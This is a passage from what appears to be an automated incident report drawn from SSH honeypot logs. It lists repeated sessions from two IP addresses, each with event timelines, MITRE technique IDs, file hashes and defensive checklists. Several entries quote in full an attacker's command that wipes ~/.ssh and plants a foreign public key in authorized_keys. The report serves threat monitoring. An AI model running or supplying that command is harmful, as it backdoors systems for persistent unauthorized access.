| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:33:38` | `cowrie.session.connect` |
| `2026-04-12 02:33:38` | `cowrie.client.version` |
| `2026-04-12 02:33:38` | `cowrie.client.kex` |
| `2026-04-12 02:33:39` | `cowrie.login.success` |
| `2026-04-12 02:33:40` | `cowrie.session.params` |
| `2026-04-12 02:33:40` | `cowrie.command.input` |
| `2026-04-12 02:33:40` | `cowrie.command.failed` |
| `2026-04-12 02:33:40` | `cowrie.log.closed` |
| `2026-04-12 02:33:40` | `cowrie.session.params` |
| `2026-04-12 02:33:40` | `cowrie.command.input` |
| `2026-04-12 02:33:40` | `cowrie.session.file_download` |
| `2026-04-12 02:33:40` | `cowrie.log.closed` |
| `2026-04-12 02:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f38002efdec

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 02:33 |
| **Last Seen** | 2026-04-12 02:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:33:43` | `cowrie.session.connect` |
| `2026-04-12 02:33:43` | `cowrie.client.version` |
| `2026-04-12 02:33:43` | `cowrie.client.kex` |
| `2026-04-12 02:33:44` | `cowrie.login.success` |
| `2026-04-12 02:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e8f280a17e0

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 02:38 |
| **Last Seen** | 2026-04-12 02:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:38:46` | `cowrie.session.connect` |
| `2026-04-12 02:38:46` | `cowrie.client.version` |
| `2026-04-12 02:38:46` | `cowrie.client.kex` |
| `2026-04-12 02:38:46` | `cowrie.login.success` |
| `2026-04-12 02:38:47` | `cowrie.session.params` |
| `2026-04-12 02:38:47` | `cowrie.command.input` |
| `2026-04-12 02:38:47` | `cowrie.command.failed` |
| `2026-04-12 02:38:47` | `cowrie.log.closed` |
| `2026-04-12 02:38:47` | `cowrie.session.params` |
| `2026-04-12 02:38:47` | `cowrie.command.input` |
| `2026-04-12 02:38:48` | `cowrie.session.file_download` |
| `2026-04-12 02:38:48` | `cowrie.log.closed` |
| `2026-04-12 02:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e328a04c1be

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 02:38 |
| **Last Seen** | 2026-04-12 02:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:38:50` | `cowrie.session.connect` |
| `2026-04-12 02:38:50` | `cowrie.client.version` |
| `2026-04-12 02:38:50` | `cowrie.client.kex` |
| `2026-04-12 02:38:51` | `cowrie.login.success` |
| `2026-04-12 02:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0388a1f27a2b

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 02:40 |
| **Last Seen** | 2026-04-12 02:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:40:39` | `cowrie.session.connect` |
| `2026-04-12 02:40:39` | `cowrie.client.version` |
| `2026-04-12 02:40:39` | `cowrie.client.kex` |
| `2026-04-12 02:40:40` | `cowrie.login.success` |
| `2026-04-12 02:40:40` | `cowrie.session.params` |
| `2026-04-12 02:40:40` | `cowrie.command.input` |
| `2026-04-12 02:40:40` | `cowrie.command.failed` |
| `2026-04-12 02:40:40` | `cowrie.log.closed` |
| `2026-04-12 02:40:40` | `cowrie.session.params` |
| `2026-04-12 02:40:40` | `cowrie.command.input` |
| `2026-04-12 02:40:41` | `cowrie.session.file_download` |
| `2026-04-12 02:40:41` | `cowrie.log.closed` |
| `2026-04-12 02:40:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71a093eae535

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 02:40 |
| **Last Seen** | 2026-04-12 02:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:40:43` | `cowrie.session.connect` |
| `2026-04-12 02:40:43` | `cowrie.client.version` |
| `2026-04-12 02:40:43` | `cowrie.client.kex` |
| `2026-04-12 02:40:44` | `cowrie.login.success` |
| `2026-04-12 02:40:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cccdde6a7df2

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 02:42 |
| **Last Seen** | 2026-04-12 02:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:42:20` | `cowrie.session.connect` |
| `2026-04-12 02:42:20` | `cowrie.client.version` |
| `2026-04-12 02:42:21` | `cowrie.client.kex` |
| `2026-04-12 02:42:22` | `cowrie.login.success` |
| `2026-04-12 02:42:22` | `cowrie.session.params` |
| `2026-04-12 02:42:22` | `cowrie.command.input` |
| `2026-04-12 02:42:22` | `cowrie.command.failed` |
| `2026-04-12 02:42:22` | `cowrie.log.closed` |
| `2026-04-12 02:42:23` | `cowrie.session.params` |
| `2026-04-12 02:42:23` | `cowrie.command.input` |
| `2026-04-12 02:42:23` | `cowrie.session.file_download` |
| `2026-04-12 02:42:23` | `cowrie.log.closed` |
| `2026-04-12 02:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9f1241f55f6

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 02:42 |
| **Last Seen** | 2026-04-12 02:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:42:25` | `cowrie.session.connect` |
| `2026-04-12 02:42:25` | `cowrie.client.version` |
| `2026-04-12 02:42:25` | `cowrie.client.kex` |
| `2026-04-12 02:42:26` | `cowrie.login.success` |
| `2026-04-12 02:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d613ca425fd

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 02:45 |
| **Last Seen** | 2026-04-12 02:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:45:52` | `cowrie.session.connect` |
| `2026-04-12 02:45:52` | `cowrie.client.version` |
| `2026-04-12 02:45:52` | `cowrie.client.kex` |
| `2026-04-12 02:45:52` | `cowrie.login.success` |
| `2026-04-12 02:45:53` | `cowrie.session.params` |
| `2026-04-12 02:45:53` | `cowrie.command.input` |
| `2026-04-12 02:45:53` | `cowrie.command.failed` |
| `2026-04-12 02:45:53` | `cowrie.log.closed` |
| `2026-04-12 02:45:53` | `cowrie.session.params` |
| `2026-04-12 02:45:53` | `cowrie.command.input` |
| `2026-04-12 02:45:54` | `cowrie.session.file_download` |
| `2026-04-12 02:45:54` | `cowrie.log.closed` |
| `2026-04-12 02:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c13f80ab271

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 02:45 |
| **Last Seen** | 2026-04-12 02:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:45:56` | `cowrie.session.connect` |
| `2026-04-12 02:45:56` | `cowrie.client.version` |
| `2026-04-12 02:45:56` | `cowrie.client.kex` |
| `2026-04-12 02:45:57` | `cowrie.login.success` |
| `2026-04-12 02:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a0d683d6b2a

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 02:48 |
| **Last Seen** | 2026-04-12 02:49 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:48:43` | `cowrie.session.connect` |
| `2026-04-12 02:48:43` | `cowrie.client.version` |
| `2026-04-12 02:48:44` | `cowrie.client.kex` |
| `2026-04-12 02:48:46` | `cowrie.login.success` |
| `2026-04-12 02:48:48` | `cowrie.session.params` |
| `2026-04-12 02:48:48` | `cowrie.command.input` |
| `2026-04-12 02:48:48` | `cowrie.command.failed` |
| `2026-04-12 02:48:48` | `cowrie.log.closed` |
| `2026-04-12 02:48:50` | `cowrie.session.params` |
| `2026-04-12 02:48:50` | `cowrie.command.input` |
| `2026-04-12 02:48:50` | `cowrie.session.file_download` |
| `2026-04-12 02:48:50` | `cowrie.log.closed` |
| `2026-04-12 02:49:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdf95dd087b3

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 02:48 |
| **Last Seen** | 2026-04-12 02:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:48:56` | `cowrie.session.connect` |
| `2026-04-12 02:48:56` | `cowrie.client.version` |
| `2026-04-12 02:48:57` | `cowrie.client.kex` |
| `2026-04-12 02:49:00` | `cowrie.login.success` |
| `2026-04-12 02:49:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f3dfed99d05

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 02:56 |
| **Last Seen** | 2026-04-12 02:56 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:56:09` | `cowrie.session.connect` |
| `2026-04-12 02:56:09` | `cowrie.client.version` |
| `2026-04-12 02:56:09` | `cowrie.client.kex` |
| `2026-04-12 02:56:12` | `cowrie.login.success` |
| `2026-04-12 02:56:14` | `cowrie.session.params` |
| `2026-04-12 02:56:14` | `cowrie.command.input` |
| `2026-04-12 02:56:14` | `cowrie.command.failed` |
| `2026-04-12 02:56:15` | `cowrie.log.closed` |
| `2026-04-12 02:56:16` | `cowrie.session.params` |
| `2026-04-12 02:56:16` | `cowrie.command.input` |
| `2026-04-12 02:56:17` | `cowrie.session.file_download` |
| `2026-04-12 02:56:17` | `cowrie.log.closed` |
| `2026-04-12 02:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b8c013e5145

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 02:56 |
| **Last Seen** | 2026-04-12 02:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:56:24` | `cowrie.session.connect` |
| `2026-04-12 02:56:24` | `cowrie.client.version` |
| `2026-04-12 02:56:25` | `cowrie.client.kex` |
| `2026-04-12 02:56:27` | `cowrie.login.success` |
| `2026-04-12 02:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c16e2cb6f04b

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 02:56 |
| **Last Seen** | 2026-04-12 02:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:56:39` | `cowrie.session.connect` |
| `2026-04-12 02:56:39` | `cowrie.client.version` |
| `2026-04-12 02:56:39` | `cowrie.client.kex` |
| `2026-04-12 02:56:40` | `cowrie.login.success` |
| `2026-04-12 02:56:40` | `cowrie.session.params` |
| `2026-04-12 02:56:40` | `cowrie.command.input` |
| `2026-04-12 02:56:40` | `cowrie.command.failed` |
| `2026-04-12 02:56:40` | `cowrie.log.closed` |
| `2026-04-12 02:56:41` | `cowrie.session.params` |
| `2026-04-12 02:56:41` | `cowrie.command.input` |
| `2026-04-12 02:56:41` | `cowrie.session.file_download` |
| `2026-04-12 02:56:41` | `cowrie.log.closed` |
| `2026-04-12 02:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-312a37ab0bfe

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 02:56 |
| **Last Seen** | 2026-04-12 02:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:56:43` | `cowrie.session.connect` |
| `2026-04-12 02:56:43` | `cowrie.client.version` |
| `2026-04-12 02:56:44` | `cowrie.client.kex` |
| `2026-04-12 02:56:44` | `cowrie.login.success` |
| `2026-04-12 02:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]199` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5fcbd761b4a

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 03:00 |
| **Last Seen** | 2026-04-12 03:00 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 03:00:02` | `cowrie.session.connect` |
| `2026-04-12 03:00:02` | `cowrie.client.version` |
| `2026-04-12 03:00:03` | `cowrie.client.kex` |
| `2026-04-12 03:00:06` | `cowrie.login.success` |
| `2026-04-12 03:00:08` | `cowrie.session.params` |
| `2026-04-12 03:00:08` | `cowrie.command.input` |
| `2026-04-12 03:00:08` | `cowrie.command.failed` |
| `2026-04-12 03:00:09` | `cowrie.log.closed` |
| `2026-04-12 03:00:10` | `cowrie.session.params` |
| `2026-04-12 03:00:10` | `cowrie.command.input` |
| `2026-04-12 03:00:10` | `cowrie.session.file_download` |
| `2026-04-12 03:00:10` | `cowrie.log.closed` |
| `2026-04-12 03:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a66ce6dc1d17

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 03:00 |
| **Last Seen** | 2026-04-12 03:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
